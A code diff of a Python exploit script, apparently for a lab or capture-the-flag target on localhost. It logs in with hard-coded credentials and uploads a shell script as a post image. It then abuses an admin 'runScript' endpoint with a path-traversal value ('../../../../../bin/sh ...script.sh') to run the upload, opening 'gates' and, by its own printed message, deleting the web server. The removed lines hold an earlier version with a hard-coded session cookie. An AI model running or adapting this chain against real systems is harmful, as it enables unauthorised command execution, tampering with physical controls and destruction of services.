@@ -1,17 +1,63 @@
 import requests
+session = requests.Session()
 
-# URL to which the POST request is sent
+
+# Get PHPSESSID cookie
+url = 'http://localhost:8080/'
+response = session.get(url)
+assert response.status_code == 200
+assert "err" not in response.url
+assert "err" not in response.text
+assert "Permission denied" not in response.text
+
+# Log in
+url = 'http://localhost:8080/auth/login'
+payload = {'username': 'rekt0r', 'password': '152360752a', 'agreement': 1}
+response = session.post(url, data=payload)
+
+assert response.url != 'http://localhost:8080/?err=login'
+assert response.status_code == 200
+assert "err" not in response.url
+assert "err" not in response.text
+assert "Permission denied" not in response.text
+print("Logged in successfully")
+
+
+# Upload  script using post
+url = 'http://localhost:8080/inside/post/create'
+script_name = 'script.sh'
+files = {'image': open(script_name ,'rb')}
+payload = {'text': 'Automated Script'}
+response = session.post(url, files=files, data=payload)
+assert response.status_code == 200
+assert response.status_code == 200
+assert "err" not in response.url
+assert "err" not in response.text
+assert "Permission denied" not in response.text
+print("Script uploaded")
+
+# Fix permissions
 url = "http://localhost:8080/admin/runScript"
+payload = {'name': 'fix-permissions.sh'}
+response = session.post(url, data=payload)
+assert response.status_code == 200
+assert "err" not in response.url
+assert "err" not in response.text
+assert "Permission denied" not in response.text
 
-# Data payload for the POST request
-payload = {'name': '../../../../../bin/sh /var/www/userupload/posts/script.sh close'}
+# Open gates
+payload = {'name': 'gates-control.sh open'}
+response = session.post(url, data=payload)
+assert response.status_code == 200
+assert "err" not in response.url
+assert "err" not in response.text
+assert "Permission denied" not in response.text
+print('Gates are open now')
 
-# Cookies to be sent with the request
-cookies = {'PHPSESSID': 'p4moa1007sm6c8qdp06b7k5m97'}
-
-# Make the POST request
-response = requests.post(url, data=payload, cookies=cookies)
-
-# Print the response from the server
-print("Status Code:", response.status_code)
-print("Response Body:", response.text)
+# Delete web server
+payload = {'name': '../../../../../bin/sh /var/www/userupload/posts/script.sh'}
+response = session.post(url, data=payload)
+assert response.status_code == 200
+assert "err" not in response.url
+assert "Permission denied" not in response.text
+print("Web server deleted")
